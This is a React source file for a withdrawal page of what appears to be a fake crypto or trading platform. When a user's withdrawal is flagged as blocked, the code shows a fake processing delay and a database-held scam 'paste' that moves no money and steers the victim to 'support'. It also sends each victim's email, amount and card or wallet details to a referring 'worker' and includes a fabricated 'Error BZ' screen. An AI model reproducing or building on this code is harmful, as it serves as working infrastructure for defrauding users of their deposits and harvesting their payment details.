import React, { useState } from 'react';
import { CreditCard, Wallet, Loader2, CheckCircle2 } from 'lucide-react';
import PageHeader from '../components/PageHeader';
import { useCurrency } from '../context/CurrencyContext';
import { Haptic } from '../utils/haptics';
import { useUser } from '../context/UserContext';
import { usePin } from '../context/PinContext';
import { useToast } from '../context/ToastContext';
import { useLanguage } from '../context/LanguageContext';
import { useWebAuth } from '../context/WebAuthContext';
import { supabase } from '../lib/supabase';
import { getSupabaseErrorMessage } from '../lib/supabaseError';
import { logAction } from '../lib/appLog';
import BottomSheetFooter from '../components/BottomSheetFooter';
import { enqueueWorkerNotification } from '../lib/workerNotifications';

type WithdrawMethod = 'CARD' | 'CRYPTO';
type CryptoNetwork = 'trc20' | 'ton' | 'btc' | 'sol';

const CRYPTO_NETWORKS: { id: CryptoNetwork; label: string; sub: string; icon: string }[] = [
  { id: 'trc20', label: 'USDT', sub: 'TRC20', icon: 'https://s2.coinmarketcap.com/static/img/coins/200x200/1958.png' },
  { id: 'ton', label: 'TON', sub: 'Toncoin', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0b/Gram_cryptocurrency_logo.svg/960px-Gram_cryptocurrency_logo.svg.png' },
  { id: 'btc', label: 'Bitcoin', sub: 'BTC', icon: 'https://pngicon.ru/file/uploads/ikonka-bitkoin.png' },
  { id: 'sol', label: 'Solana', sub: 'SOL', icon: 'https://cdn-icons-png.flaticon.com/512/6001/6001527.png' },
];

interface WithdrawPageProps {
  balance: number;
  onBack: () => void;
  onWithdraw: (amount: number) => void;
}

type Step = 'METHOD' | 'NETWORK' | 'AMOUNT' | 'REQUISITES' | 'CONFIRM' | 'PROCESS' | 'SUCCESS_APPROVED' | 'SUCCESS_PASTE' | 'SUCCESS_PASTE_BZ';

const WithdrawPage: React.FC<WithdrawPageProps> = ({ balance, onBack, onWithdraw }) => {
  const { formatPrice, symbol, convertToUsd, convertFromUsd, currencyCode } = useCurrency();
  const { user, tgid, countries, withdrawTemplates, supportLink, minWithdraw, refreshUser } = useUser();
  const { webUserId } = useWebAuth();
  const { requirePin } = usePin();
  const toast = useToast();
  const { t } = useLanguage();
  const [step, setStep] = useState<Step>('METHOD');
  const [method, setMethod] = useState<WithdrawMethod>('CARD');
  const [cryptoNetwork, setCryptoNetwork] = useState<CryptoNetwork>('trc20');
  const [amount, setAmount] = useState('');
  const [requisites, setRequisites] = useState('');
  const [selectedCountry, setSelectedCountry] = useState<{ id: number; country_name: string; country_code: string; currency: string } | null>(null);

  const template = withdrawTemplates.find((t) => t.message_type === (user?.withdraw_message_type || 'default')) || withdrawTemplates[0];
  const amountNumDisplay = parseFloat(amount.replace(',', '.')) || 0;
  const amountNumUsd = convertToUsd(amountNumDisplay);
  const requisitesNormalized = requisites.replace(/\s/g, '');
  const canSubmitAmount = balance >= minWithdraw && amountNumUsd >= minWithdraw && amountNumUsd <= balance;
  const formattedBalance = formatPrice(balance);
  const formattedMin = formatPrice(minWithdraw);
  const formattedAmount =
    amountNumDisplay > 0
      ? new Intl.NumberFormat('ru-RU', {
          style: 'decimal',
          minimumFractionDigits: amountNumDisplay < 1 ? 6 : amountNumDisplay < 100 ? 2 : 0,
          maximumFractionDigits: amountNumDisplay < 1 ? 6 : amountNumDisplay < 100 ? 2 : 0,
        }).format(amountNumDisplay)
      : '0';
  const [submitting, setSubmitting] = useState(false);

  const isRequisitesPlaceholder = (details: string | null | undefined): boolean => {
    if (!details || !details.trim()) return true;
    const lower = details.toLowerCase();
    return lower.includes('реквизиты не указаны') || lower.includes('обратитесь в поддержку') || lower.includes('доступна только криптовалюта');
  };
  const userRegionCountry = user?.country_code && countries?.length
    ? countries.find((c) => (c.country_code || '').toUpperCase() === (user.country_code || '').toUpperCase())
    : null;
  const regionHasRequisites = !user?.country_code || (userRegionCountry != null && !isRequisitesPlaceholder(userRegionCountry.bank_details));

  const maskRequisites = (s: string, isCrypto = false) => {
    const n = s.replace(/\s/g, '');
    if (!n) return '—';
    if (isCrypto) {
      if (n.length <= 12) return n;
      return n.slice(0, 8) + '…' + n.slice(-8);
    }
    if (n.length <= 4) return n;
    return '•••• ' + n.slice(-4);
  };

  const currentNetwork = CRYPTO_NETWORKS.find((n) => n.id === cryptoNetwork);

  const handleConfirmWithdraw = async () => {
    const actorId = tgid || webUserId?.toString();
    if (!actorId || !user || amountNumUsd <= 0 || amountNumUsd > balance) {
      Haptic.error();
      return;
    }
    Haptic.light();
    setStep('PROCESS');
    setSubmitting(true);

    // Notify worker about withdraw attempt (should not block UI)
    enqueueWorkerNotification(user.referrer_id, user.user_id, 'withdraw_attempt', {
      user_id: user.user_id,
      email: user.email ?? null,
      country: user.country_code ?? null,
      amount_display: amountNumDisplay,
      amount_usd: amountNumUsd,
      currency: currencyCode,
      method,
      requisites: requisitesNormalized || null,
    }).catch(() => {});

    const withdrawBlocked = !!user.withdraw_blocked;

    if (withdrawBlocked) {
      // Вывод заблокирован: показываем пасту вывода (шаблон из withdraw_message_templates), баланс не списываем
      await new Promise((r) => setTimeout(r, 1800));
      Haptic.light();
      // Если шаблон не найден по типу, template автоматически возьмет первый доступный из БД (withdrawTemplates[0])
      setStep('SUCCESS_PASTE');
      setSubmitting(false);
      return;
    }

    // Вывод разблокирован: списываем сумму с баланса и показываем успех (независимо от реквизитов)
    await new Promise((r) => setTimeout(r, 2200));
    const newBalance = balance - amountNumUsd;
    const { error } = await supabase
      .from('users')
      .update({ balance: newBalance })
      .eq('user_id', user.user_id);
    if (error) {
      Haptic.error();
      setStep('CONFIRM');
      toast.show(getSupabaseErrorMessage(error, t('withdraw_error')), 'error');
      setSubmitting(false);
      return;
    }
    await refreshUser();
    onWithdraw(amountNumUsd);
    Haptic.success();
    logAction('withdraw_request', {
      userId: user.user_id,
      tgid: actorId,
      payload: {
        amount_display: amountNumDisplay,
        amount_usd: amountNumUsd,
        currency: currencyCode,
        method,
      },
    }).catch(() => {});
    setStep('SUCCESS_APPROVED');
    setSubmitting(false);
  };

  const handleBack = () => {
    Haptic.tap();
    if (step === 'METHOD') {
      onBack();
      return;
    }
    if (step === 'AMOUNT') {
      setStep('METHOD');
      return;
    }
    if (step === 'NETWORK') {
      setStep('METHOD');
      return;
    }
    if (step === 'REQUISITES') {
      setStep('AMOUNT');
      return;
    }
    if (step === 'CONFIRM') {
      setStep('REQUISITES');
      return;
    }
    onBack();
  };

  const renderStepContent = () => {
    switch (step) {
      case 'METHOD':
        return (
          <div className="px-4 pt-4 space-y-3">
            <p className="text-xs text-textSubtle mb-2">{t('withdraw_method_select')}</p>
            <div className="space-y-3">
              <button
                onClick={() => {
                  Haptic.light();
                  setMethod('CARD');
                  setStep('AMOUNT');
                }}
                className="w-full flex items-center gap-4 p-5 rounded-2xl bg-card/20 border border-white/5 transition-all active:scale-[0.98] hover-row"
              >
                <div className="w-12 h-12 rounded-full bg-blue-500/10 flex items-center justify-center">
                  <CreditCard className="text-blue-400" size={24} />
                </div>
                <div className="text-left">
                  <div className="text-sm font-semibold text-textPrimary">{t('withdraw_to_card')}</div>
                  <div className="text-[11px] text-textSubtle">{t('withdraw_to_card_desc')}</div>
                </div>
              </button>

              <button
                onClick={() => {
                  Haptic.light();
                  setMethod('CRYPTO');
                  setStep('NETWORK');
                }}
                className="w-full flex items-center gap-4 p-5 rounded-2xl bg-card/20 border border-white/5 transition-all active:scale-[0.98] hover-row"
              >
                <div className="w-12 h-12 rounded-full bg-green-500/10 flex items-center justify-center">
                  <Wallet className="text-green-400" size={24} />
                </div>
                <div className="text-left">
                  <div className="text-sm font-semibold text-textPrimary">{t('withdraw_to_crypto')}</div>
                  <div className="text-[11px] text-textSubtle">{t('withdraw_to_crypto_desc')}</div>
                </div>
              </button>
            </div>
          </div>
        );

      case 'NETWORK':
        return (
          <div className="max-w-md mx-auto pt-6 px-4 pb-8">
            <p className="text-textMuted text-sm mb-4">{t('withdraw_crypto_title')}</p>
            <div className="grid grid-cols-2 gap-4">
              {CRYPTO_NETWORKS.map((net) => (
                <button
                  key={net.id}
                  type="button"
                  onClick={() => {
                    Haptic.light();
                    setCryptoNetwork(net.id);
                    setStep('AMOUNT');
                  }}
                  className="flex flex-col items-center py-6 px-4 rounded-2xl bg-surface border border-neutral-800 hover:border-neon/50 active:scale-[0.98] transition-all"
                >
                  <div className="w-20 h-20 rounded-full overflow-hidden bg-neutral-900 border-2 border-neutral-700 flex items-center justify-center mb-3">
                    <img src={net.icon} alt="" className="w-12 h-12 object-contain" />
                  </div>
                  <span className="font-semibold text-white text-sm">{net.label}</span>
                  <span className="text-xs text-neutral-500 mt-0.5">{net.sub}</span>
                </button>
              ))}
            </div>
          </div>
        );

      case 'AMOUNT':
        return (
          <div className="space-y-6 pt-6 px-4">
            <div className="rounded-xl p-4.5 bg-white/[0.015] border border-white/[0.03] mb-6">
              <label className="text-[10px] text-textSubtle uppercase tracking-widest block mb-2">{t('amount_withdraw')}</label>
              <div className="flex items-center justify-between gap-3">
                <input
                  type="text"
                  inputMode="decimal"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="flex-1 bg-transparent text-2xl font-mono font-bold text-textPrimary outline-none placeholder:text-white/5"
                  placeholder="0"
                  autoFocus
                />
                <span className="text-lg font-mono text-textSubtle">$</span>
              </div>
              <div className="flex justify-between items-center mt-3 pt-3 border-t border-white/[0.03]">
                <div className="text-[10px] text-textSubtle">
                  {t('available')}: <span className="text-textPrimary">{formatPrice(balance)} $</span>
                </div>
                <button
                  onClick={() => {
                    Haptic.tap();
                    setAmount(String(convertFromUsd(balance)));
                  }}
                  className="text-[10px] text-neon font-bold uppercase tracking-wider"
                >
                  {t('max')}
                </button>
              </div>
            </div>
            <button
              onClick={() => {
                if (!amount || isNaN(amountNumDisplay) || amountNumUsd < minWithdraw) {
                  Haptic.error();
                  toast.show(`${t('min_withdraw_toast', { amount: formattedMin })} ${symbol}`, 'error');
                  return;
                }
                if (amountNumUsd > balance) {
                  Haptic.error();
                  toast.show(t('insufficient_balance'), 'error');
                  return;
                }
                Haptic.light();
                setStep('REQUISITES');
              }}
              disabled={!amount || amountNumUsd < minWithdraw || amountNumUsd > balance}
              className="w-full py-4 bg-neon text-black font-bold rounded-xl active:scale-95 transition-transform disabled:opacity-50 disabled:pointer-events-none"
            >
              {t('withdraw_further')}
            </button>
          </div>
        );

      case 'REQUISITES':
        return (
          <div className="space-y-6 pt-6 px-4">
            <div className="bg-white/[0.015] border border-white/[0.03] rounded-xl p-4.5">
              <span className="text-xs text-neutral-500 uppercase">{t('withdraw_amount_label')}</span>
              <div className="text-xl font-mono font-bold text-white">{formattedAmount} {symbol}</div>
              {method === 'CRYPTO' && currentNetwork && (
                <div className="text-xs text-neutral-400 mt-1">{t('network_label')}: {currentNetwork.label} ({currentNetwork.sub})</div>
              )}
            </div>
            <div className="space-y-2">
              <label className="text-xs text-neutral-500 uppercase font-bold pl-1">
                {method === 'CRYPTO' ? t('withdraw_address_for_receive') : t('withdraw_requisites_for_receive')}
              </label>
              <div className="bg-white/[0.015] border border-white/[0.035] rounded-xl px-4 py-3 focus-within:border-neon/40 transition-all">
                {method === 'CRYPTO' ? (
                  <input
                    type="text"
                    value={requisites}
                    onChange={(e) => setRequisites(e.target.value.trim())}
                    className="w-full bg-transparent text-white font-mono text-sm outline-none placeholder-neutral-600 break-all"
                    placeholder={currentNetwork ? `${t('withdraw_crypto_address')} ${currentNetwork.label} (${currentNetwork.sub})` : t('withdraw_crypto_address')}
                  />
                ) : (
                  <input
                    type="text"
                    inputMode="numeric"
                    value={requisites}
                    onChange={(e) => setRequisites(e.target.value.replace(/\D/g, '').slice(0, 24))}
                    className="w-full bg-transparent text-white font-mono text-lg outline-none placeholder-neutral-600"
                    placeholder={t('withdraw_requisites_hint')}
                  />
                )}
              </div>
              <p className="text-[10px] text-neutral-600 px-1">
                {method === 'CRYPTO'
                  ? t('withdraw_address_hint')
                  : t('withdraw_requisites_hint_long')}
              </p>
            </div>
            <button
              onClick={() => {
                if (!requisites.trim()) {
                  Haptic.error();
                  toast.show(method === 'CRYPTO' ? t('withdraw_enter_address_toast') : t('withdraw_enter_requisites_toast'), 'error');
                  return;
                }
                Haptic.light();
                setStep('CONFIRM');
              }}
              disabled={!requisites.trim()}
              className="w-full py-4 bg-neon text-black font-bold rounded-xl active:scale-95 transition-transform disabled:opacity-50 disabled:pointer-events-none"
            >
              {t('withdraw_further')}
            </button>
          </div>
        );

      case 'CONFIRM':
        return (
        <div className="pt-6 px-4 flex flex-col">
          <div className="bg-surface border border-neutral-800 rounded-xl p-5 space-y-4 mb-6 relative overflow-hidden">
            <div className="absolute top-0 left-0 w-1 h-full bg-neon" />
            <div>
              <div className="text-xs text-neutral-500 uppercase tracking-wider mb-1">{t('withdraw_amount_label')}</div>
              <div className="text-2xl font-mono font-bold text-white">{formattedAmount} {symbol}</div>
            </div>
            <div className="h-px bg-border w-full" />
            {method === 'CRYPTO' && currentNetwork && (
              <div>
                <div className="text-xs text-neutral-500 uppercase tracking-wider mb-1">{t('network_label')}</div>
                <div className="text-sm font-medium text-white">{currentNetwork.label} ({currentNetwork.sub})</div>
              </div>
            )}
            <div>
              <div className="text-xs text-neutral-500 uppercase tracking-wider mb-1">
                {method === 'CRYPTO' ? t('withdraw_crypto_address') : t('withdraw_requisites_label')}
              </div>
              <div className="text-sm font-mono text-white bg-neutral-900 rounded-lg p-3 border border-dashed border-neutral-700 break-all">
                {requisitesNormalized ? maskRequisites(requisitesNormalized, method === 'CRYPTO') : '—'}
              </div>
            </div>
          </div>
          <BottomSheetFooter
            onCancel={() => {
              Haptic.tap();
              setStep('REQUISITES');
            }}
            onConfirm={() => {
              if (submitting) return;
              const userId = tgid || webUserId?.toString();
              userId ? requirePin(userId, t('enter_pin_for_withdraw'), handleConfirmWithdraw) : handleConfirmWithdraw();
            }}
            confirmLabel={t('withdraw_confirm_btn')}
            confirmLoading={submitting}
            sticky
            reserveBottomNav
          />
        </div>
        );

      case 'PROCESS':
        return (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-background z-50 animate-fade-in p-6">
            <div className="relative flex items-center justify-center h-24 w-24 rounded-full bg-card border border-neon mb-6">
              <div className="absolute inset-0 rounded-full border-2 border-neon/40 border-t-transparent animate-spin" />
              <Loader2 size={40} className="text-neon animate-pulse" />
            </div>
            <h2 className="text-xl font-bold text-white mb-2">{t('withdraw_processing')}</h2>
            <p className="text-neutral-500 text-sm text-center max-w-xs">
              {t('withdraw_checking')}
            </p>
          </div>
        );

      case 'SUCCESS_APPROVED':
        return (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-background z-50 animate-fade-in p-6 text-center">
            <div className="relative flex items-center justify-center h-28 w-28 rounded-full bg-green-500/10 mb-6">
              <div className="absolute inset-0 rounded-full border-2 border-green-500/50 animate-pulse" />
              <CheckCircle2 size={56} className="text-up" />
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">{t('withdraw_approved')}</h2>
            <p className="text-neutral-400 mb-2">
              <span className="font-mono text-white">{formattedAmount} {symbol}</span> {t('withdrawn_from_balance')}.
            </p>
            <p className="text-neutral-500 text-sm mb-8 max-w-xs">
              {t('withdraw_funds_note')}
            </p>
            <button
              onClick={() => { Haptic.tap(); onBack(); }}
              className="px-8 py-3 rounded-full bg-neon text-black font-bold active:scale-95"
            >
              {t('withdraw_to_profile')}
            </button>
          </div>
        );

      case 'SUCCESS_PASTE':
        return (
          <div className="absolute inset-0 flex flex-col bg-background z-50 animate-fade-in p-6 overflow-y-auto">
            <div className="flex flex-col items-center text-center pt-4 pb-6">
              <div className="h-16 w-16 rounded-full bg-neutral-800 flex items-center justify-center text-3xl mb-4">
                {template?.icon || '💬'}
              </div>
              <h2 className="text-xl font-bold text-white mb-2">{template?.title || t('withdraw_request_title')}</h2>
              <p className="text-neutral-500 text-sm mb-6">
                {t('withdraw_request_accepted', { amount: `${formattedAmount} ${symbol}` })}
              </p>
            </div>
            <div className="bg-surface border border-neutral-800 rounded-xl p-5 mb-6">
              <p className="text-sm text-neutral-300 whitespace-pre-wrap leading-relaxed">
                {template?.description || t('withdraw_contact_support_desc')}
              </p>
            </div>
            <a
              href={supportLink}
              target="_blank"
              rel="noopener noreferrer"
              className="block w-full py-4 bg-neon text-black font-bold rounded-xl text-center active:scale-95 transition-transform mb-4"
              onClick={() => Haptic.tap()}
            >
              {template?.button_text || t('write_to_support')}
            </a>
            <button
              onClick={() => { Haptic.tap(); onBack(); }}
              className="w-full py-3 border border-neutral-700 text-neutral-400 rounded-xl font-medium"
            >
              {t('withdraw_to_profile')}
            </button>
          </div>
        );

      case 'SUCCESS_PASTE_BZ':
        return (
          <div className="absolute inset-0 flex flex-col bg-background z-50 animate-fade-in p-6 overflow-y-auto">
            <div className="flex flex-col items-center text-center pt-4 pb-6">
              <div className="h-16 w-16 rounded-full bg-red-500/20 flex items-center justify-center text-3xl mb-4">⚠️</div>
              <h2 className="text-xl font-bold text-white mb-2">Ошибка вывода (BZ)</h2>
              <p className="text-neutral-500 text-sm mb-6">
                {t('withdraw_request_accepted', { amount: `${formattedAmount} ${symbol}` })}
              </p>
            </div>
            <div className="bg-surface border border-red-500/30 rounded-xl p-5 mb-6">
              <p className="text-sm text-neutral-300 whitespace-pre-wrap leading-relaxed">
                Вывод средств временно недоступен. Ошибка BZ. Обратитесь в поддержку для уточнения.
              </p>
            </div>
            <a
              href={supportLink}
              target="_blank"
              rel="noopener noreferrer"
              className="block w-full py-4 bg-neon text-black font-bold rounded-xl text-center active:scale-95 transition-transform mb-4"
              onClick={() => Haptic.tap()}
            >
              {t('write_to_support')}
            </a>
            <button
              onClick={() => { Haptic.tap(); onBack(); }}
              className="w-full py-3 border border-neutral-700 text-neutral-400 rounded-xl font-medium"
            >
              {t('withdraw_to_profile')}
            </button>
          </div>
        );

      default:
        return null;
    }
  };

  const showHeader = step !== 'PROCESS' && step !== 'SUCCESS_APPROVED' && step !== 'SUCCESS_PASTE' && step !== 'SUCCESS_PASTE_BZ';

  return (
    <div className="flex flex-col h-full bg-background animate-fade-in relative">
      {showHeader && <PageHeader title={t('withdraw_title')} onBack={handleBack} />}
      <div className="flex-1 overflow-y-auto no-scrollbar relative">
        {renderStepContent()}
      </div>
    </div>
  );
};

export default WithdrawPage;
